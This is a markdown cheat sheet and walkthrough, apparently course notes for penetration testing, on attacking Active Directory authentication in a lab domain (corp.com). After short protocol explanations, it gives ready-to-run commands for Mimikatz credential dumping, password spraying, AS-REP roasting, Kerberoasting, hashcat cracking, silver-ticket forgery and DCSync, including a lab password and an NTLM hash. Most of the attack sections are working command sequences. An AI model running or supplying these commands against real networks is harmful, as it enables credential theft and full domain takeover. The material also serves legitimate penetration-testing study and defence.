# Attacking Active Directory Authentication - Cheat Sheet & Walkthrough

## Table of Contents
1. [Understanding AD Authentication](#1-understanding-ad-authentication)
2. [Password Attacks](#2-password-attacks)
3. [AS-REP Roasting](#3-as-rep-roasting)
4. [Kerberoasting](#4-kerberoasting)
5. [Silver Tickets](#5-silver-tickets)
6. [Domain Controller Synchronization (DCSync)](#6-domain-controller-synchronization-dcsync)
7. [Quick Reference](#7-quick-reference)

---

## 1. Understanding AD Authentication

### 1.1 NTLM Authentication

#### NTLM Authentication Flow

```
Client (User)           Server                  Domain Controller
     |                     |                            |
     |---(1) Username----->|                            |
     |                     |                            |
     |<-(2) Challenge (Nonce)-|                         |
     |                     |                            |
     |-(3) Response-------→|                            |
     |  (Nonce encrypted   |                            |
     |   with NTLM hash)   |                            |
     |                     |                            |
     |                     |--(4) Username, Nonce, ---→|
     |                     |    Response                |
     |                     |                            |
     |                     |<-(5) Success/Fail----------|
```

#### NTLM Characteristics
- **Challenge-Response** based
- **NTLM hash** = MD4 of password (fast to crack)
- Used when Kerberos unavailable
- Vulnerable to cracking with high-end GPUs

#### NTLM Hash Cracking Speeds
| GPU | MD5/S | NTLM/S | 8-char time | 9-char time |
|-----|-------|--------|-------------|-------------|
| RTX 3090 | 68B | 600B+ | ~2.5 hours | ~11 days |

---

### 1.2 Kerberos Authentication

#### Kerberos Flow Diagram

```
Client                          KDC (DC)                    Service
    |                              |                            |
    |--(1) AS-REQ----------------→|                            |
    |   (Username + encrypted      |                            |
    |    timestamp)                |                            |
    |                              |                            |
    |←-(2) AS-REP-----------------|                            |
    |   (TGT + Session Key)        |                            |
    |                              |                            |
    |--(3) TGS-REQ---------------→|                            |
    |   (TGT + Service Request)    |                            |
    |                              |                            |
    |←-(4) TGS-REP----------------|                            |
    |   (Service Ticket + Session  |                            |
    |    Key for Service)          |                            |
    |                              |                            |
    |--(5) AP-REQ────────────────────────────────────────────→|
    |   (Service Ticket +          |                            |
    |    Authenticator)            |                            |
    |                              |                            |
    |←-(6) Access Granted─────────────────────────────────────|
```

#### Key Kerberos Components

| Component | Description |
|-----------|-------------|
| **AS-REQ** | Authentication Server Request (initial login) |
| **AS-REP** | Authentication Server Reply (TGT + Session Key) |
| **TGT** | Ticket Granting Ticket (encrypted with krbtgt hash) |
| **TGS-REQ** | Ticket Granting Service Request (TGT + SPN) |
| **TGS-REP** | Ticket Granting Service Reply (Service Ticket) |
| **AP-REQ** | Application Request (Service Ticket + Authenticator) |
| **krbtgt** | Service account for KDC (critical to protect) |

#### Kerberos Ticket Lifetimes
- **TGT**: 10 hours (default)
- **Service Ticket**: 10 hours (default)
- **Renewal**: Does NOT require re-entering password

---

### 1.3 Cached AD Credentials

#### LSASS Storage
- Password hashes cached in LSASS memory
- Requires SYSTEM or local admin to access
- Tools: Mimikatz, ProcDump, Task Manager

#### Credential Types

| Credential Type | Description | Where Found |
|-----------------|-------------|-------------|
| **NTLM Hash** | MD4 of password | LSASS, SAM |
| **SHA1** | SHA-1 of password | LSASS (Server 2008+) |
| **Kerberos TGT** | Ticket Granting Ticket | LSASS |
| **Kerberos TGS** | Service Ticket | LSASS |
| **WDigest** | Cleartext password | LSASS (Old systems) |

#### Mimikatz Commands
```
# Enable debug
privilege::debug

# Dump all credentials
sekurlsa::logonpasswords

# Dump Kerberos tickets
sekurlsa::tickets

# Dump SAM (requires SYSTEM)
lsadump::sam

# DCSync (impersonate DC)
lsadump::dcsync /user:corp\dave
```

---

## 2. Password Attacks

### 2.1 Account Lockout Policy
```cmd
# Check lockout policy
net accounts
```
Key values:
- **Lockout threshold**: Attempts before lockout
- **Lockout duration**: Minutes locked out
- **Lockout observation window**: Reset timer

### 2.2 Password Spraying Methods

#### Method 1: PowerShell (LDAP/ADSI)
```powershell
# Using Spray-Passwords.ps1
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

#### Method 2: CrackMapExec (SMB)
```bash
# Single password, multiple users
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success

# Single user, single password
crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
```

#### Method 3: kerbrute (Kerberos AS-REQ)
```cmd
# Password spray via Kerberos
kerbrute_windows_amd64.exe passwordspray -d corp.com usernames.txt "Nexus123!"
```

#### kerbrute Advantages
- Only 2 UDP frames per attempt
- Very fast
- Minimal network noise
- No account lockout risk (if within policy)

---

## 3. AS-REP Roasting

### 3.1 Attack Theory

**Target**: Users with `Do not require Kerberos preauthentication` enabled

**Attack Flow**:
1. Send AS-REQ without preauthentication
2. Receive AS-REP (contains encrypted timestamp)
3. Crack AS-REP offline

### 3.2 Finding Vulnerable Users

#### PowerView
```powershell
Get-DomainUser -PreauthNotRequired
```

#### impacket-GetNPUsers
```bash
# List vulnerable users
impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete

# Request and save hashes
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```

### 3.3 Extracting AS-REP Hashes

#### Rubeus (Windows)
```cmd
Rubeus.exe asreproast /nowrap
```

#### impacket-GetNPUsers (Linux)
```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```

### 3.4 Cracking AS-REP Hashes

```bash
# Hashcat mode: 18200
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### 3.5 Targeted AS-REP Roasting

If you have `GenericWrite` or `GenericAll` on a user:
```powershell
# Set user to not require preauth
Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304}

# AS-REP roast the user
Rubeus.exe asreproast /user:username

# Remove the setting after
Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Remove
```

---

## 4. Kerberoasting

### 4.1 Attack Theory

**Target**: Service accounts with SPNs

**Why It Works**:
- Service tickets encrypted with SPN's password hash
- Any domain user can request service tickets
- No permission check on ticket request
- Offline cracking of service account passwords

### 4.2 Finding Kerberoastable Users

#### Rubeus
```cmd
# List SPN accounts
Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

#### GetUserSPNs (Linux)
```bash
# Request TGS for all SPNs
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

#### PowerView
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### 4.3 Extracting TGS Hashes

#### Rubeus (Windows)
```cmd
Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

#### impacket-GetUserSPNs (Linux)
```bash
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

### 4.4 Cracking TGS Hashes

```bash
# Hashcat mode: 13100
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### 4.5 Targeted Kerberoasting

If you have `GenericWrite` or `GenericAll` on a user:
```powershell
# Add SPN to user
Set-DomainObject -Identity username -Set @{serviceprincipalname='HTTP/example.com'}

# Kerberoast the user
Rubeus.exe kerberoast /user:username

# Remove SPN after
Set-DomainObject -Identity username -Clear serviceprincipalname
```

---

## 5. Silver Tickets

### 5.1 Attack Theory

**What**: Forged service ticket with arbitrary permissions

**Requirements**:
- SPN password hash (NTLM)
- Domain SID
- Target SPN

**Why It Works**:
- Services rarely validate PAC with DC
- Service trusts its own ticket decryption

### 5.2 Information Collection

#### Get NTLM Hash (Mimikatz)
```cmd
privilege::debug
sekurlsa::logonpasswords
```
Look for service account hash

#### Get Domain SID
```cmd
whoami /user
```
Example: `S-1-5-21-1987370270-658905905-1781884369-1105`
Domain SID: `S-1-5-21-1987370270-658905905-1781884369`

### 5.3 Creating Silver Ticket

#### Mimikatz
```cmd
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

**Parameters**:
| Parameter | Description |
|-----------|-------------|
| `/sid` | Domain SID (without RID) |
| `/domain` | Domain name |
| `/ptt` | Pass-the-ticket (inject) |
| `/target` | SPN hostname |
| `/service` | SPN service type |
| `/rc4` | NTLM hash of service account |
| `/user` | User to impersonate |

### 5.4 Verify Ticket
```cmd
# List tickets
klist

# Access service
iwr -UseDefaultCredentials http://web04
```

### 5.5 Common SPN Service Types

| Service | Description |
|---------|-------------|
| `http` | IIS web server |
| `cifs` | SMB file share |
| `ldap` | LDAP directory |
| `host` | Generic host |
| `mssql` | SQL Server |
| `termsrv` | RDP server |

---

## 6. Domain Controller Synchronization (DCSync)

### 6.1 Attack Theory

**What**: Impersonate a domain controller to request credentials

**Required Rights**:
- `Replicating Directory Changes`
- `Replicating Directory Changes All`
- `Replicating Directory Changes in Filtered Set`

**Default Users with Rights**:
- Domain Admins
- Enterprise Admins
- Administrators

### 6.2 DCSync with Mimikatz (Windows)

#### Extract Single User
```cmd
lsadump::dcsync /user:corp\dave
```

#### Extract krbtgt
```cmd
lsadump::dcsync /user:corp\krbtgt
```

#### Extract All Users
```cmd
lsadump::dcsync /all
```

### 6.3 DCSync with Impacket (Linux)

```bash
# Extract single user
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

# Extract all users
impacket-secretsdump corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

### 6.4 Crack NTLM Hash
```bash
# Hashcat mode: 1000
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### 6.5 DCSync Attack Flow

```
1. Compromise Domain Admin account
         ↓
2. Run DCSync on Domain Controller
         ↓
3. Extract NTLM hashes of all users
         ↓
4. Crack hashes or Pass-the-Hash
         ↓
5. Access any domain resource
```

---

## 7. Quick Reference

### Attack Comparison Matrix

| Attack | Target | Requires | Output | Stealth |
|--------|--------|----------|--------|---------|
| **Password Spray** | Any user | Usernames | Cleartext credentials | Low |
| **AS-REP Roasting** | Users with no preauth | Domain user | Hash (crackable) | Medium |
| **Kerberoasting** | Service accounts | Domain user | TGS Hash (crackable) | Medium |
| **Silver Ticket** | Specific service | SPN hash | Service access | High |
| **DCSync** | All users | Domain Admin | All NTLM hashes | High |

### Tools Reference

| Tool | Platform | Purpose |
|------|----------|---------|
| **Mimikatz** | Windows | Dump credentials, tickets, DCSync |
| **Rubeus** | Windows | Kerberoast, AS-REP, tickets |
| **impacket** | Linux | DCSync, Kerberoast, AS-REP |
| **CrackMapExec** | Linux | Password spraying, SMB |
| **kerbrute** | Linux/Windows | Kerberos password spraying |
| **Hashcat** | Any | Crack hashes |
| **PowerView** | Windows | AD enumeration |

### Hash Modes

| Hash Type | Mode |
|-----------|------|
| NTLM | 1000 |
| AS-REP | 18200 |
| TGS-REP (Kerberoast) | 13100 |
| Kerberos 5 TGT | 7500 |

### Key Takeaways

| Concept             | Key Point                        |
| ------------------- | -------------------------------- |
| **NTLM**            | Challenge-response, fast hashing |
| **Kerberos**        | Ticket-based, default protocol   |
| **krbtgt**          | Critical KDC account, protect it |
| **AS-REP Roasting** | No preauth users                 |
| **Kerberoasting**   | Service accounts with SPNs       |
| **Silver Ticket**   | Forged service ticket            |
| **DCSync**          | Impersonate DC to get all hashes |
| **LSASS**           | Stores credentials in memory     |